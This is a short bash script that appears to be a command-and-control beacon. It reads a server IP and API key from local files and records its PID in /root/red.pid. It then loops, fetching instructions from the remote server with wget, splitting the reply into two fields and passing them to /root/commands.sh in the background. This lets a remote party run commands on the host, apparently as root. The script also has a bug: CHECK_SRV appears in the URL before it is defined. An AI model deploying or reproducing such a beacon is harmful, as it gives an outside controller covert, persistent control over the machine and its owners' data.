#!/bin/bash
IP=$(cat ip)
KEY=$(cat api_key)
URL="http://${IP}/api/status?k=${KEY}&n=${CHECK_SRV}"
CHECK_SRV=10
PID=$$
echo $PID > /root/red.pid
LASTCMD=lcmd
while true; do
    echo $(wget -qO- "${URL}") > $LASTCMD
    FIRST=$(awk -F "[::]" '{print $1}' ${LASTCMD})
    SECOND=$(awk -F "[::]" '{print $3}' ${LASTCMD})
    /bin/sh /root/commands.sh ${FIRST} ${SECOND} &
    sleep $CHECK_SRV
done


